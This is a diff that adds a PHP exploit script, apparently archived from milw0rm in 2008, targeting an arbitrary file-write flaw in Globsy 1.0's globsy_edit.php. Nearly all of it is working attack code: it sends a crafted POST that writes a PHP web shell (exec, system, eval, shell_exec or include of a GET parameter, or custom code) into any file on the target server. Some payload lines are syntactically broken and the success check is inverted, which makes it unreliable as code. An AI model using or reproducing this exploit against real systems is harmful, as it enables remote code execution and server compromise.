@@ -1,0 +1,102 @@
+#!/usr/bin/php -q
+<?php
+
+/* 
+   ----------------------------------------------------------------------
+   Globsy <= 1.0 Remote File Rewriting Exploit
+   Discovered By StAkeR aka athos - StAkeR[at]hotmail[dot]it
+   Discovered On 12/10/2008
+   http://switch.dl.sourceforge.net/sourceforge/globsy/globsy_1.0.tar.gz
+   ----------------------------------------------------------------------
+   
+   globsy_edit.php
+   
+37. elseif($mode == "save"){   
+38. $handle = fopen($filename, "w") or die("Write: The file <i>'".$filename."'</i> could not be opened.");
+39. fwrite($handle, $data) or die("Write: The file <i>'".$filename."'</i> could not be writen.");    
+   
+   $mode is $_POST['mode'] and $data = $_POST['data']
+   
+   so you can rewrite (or create) any file 
+    
+*/
+
+
+error_reporting(0);
+ini_set("default_socket_timeout",5);
+
+$host = str_replace('http:\/\/',null,$argv[1]);
+$path = $argv[2]."/globsy_edit.php?file=";
+$file = $argv[3];
+$exec = intval($argv[4]);
+
+if($exec == 8)
+{
+  $input = stripslashes(trim(fgets(STDIN)));
+}
+else
+{
+  $input = "Write your code\r\n";
+}
+
+
+$array = array(
+               'include($_GET["input"]);',
+               'exec($_GET["input");',
+               'eval($_GET["input");',
+               'file_get_contents($_GET["input"]);',
+               'phpinfo();',
+               'system($_GET["input");',
+               'shell_exec($_GET["input");',
+               'echo $_GET["input");',
+                $input
+              );
+
+if($argc != 5)
+{
+  echo "[?] Globsy <= 1.0 Remote File Rewriting Exploit\r\n";
+  echo "[?] Usage: php $argv[0] [host] [path] [file] [option]\r\n\r\n";
+  echo "[?] Options: \r\n";
+ 
+  for($i=0;$i<=count($array)-1;$i++)
+  {
+    echo "-$i $array[$i]\r\n";
+  }  
+    return exit;
+} 
+
+if(!$sock = fsockopen($host,80)) die("[?] Socket Error\r\n");
+
+$path .= $file;
+$post .= "mode=save&data=<?php {$array[$exec]} ?>";
+$data .= "POST /$path HTTP/1.1\r\n";
+$data .= "Host: $host\r\n";
+$data .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
+$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$data .= "Accept-Encoding: text/plain\r\n";
+$data .= "Content-Length: ".strlen($post)."\r\n";
+$data .= "Connection: close\r\n\r\n";
+$data .= $post;
+
+if(!fputs($sock,$data)) die("[?] Fputs Error!\n");
+
+while(!feof($sock)) 
+{
+  $content .= fgets($sock);
+} fclose($sock); 
+
+if(!strpos('File data saved OK',$content))
+{
+  echo "[?] Exploit Successfully!\r\n";
+  echo "[?] $array[$exec] written in $file\r\n";
+}
+else
+{
+  echo "[?] Exploit Failed!\r\n";
+  exit;
+}
+  
+  
+?>
+
+# milw0rm.com [2008-10-12]
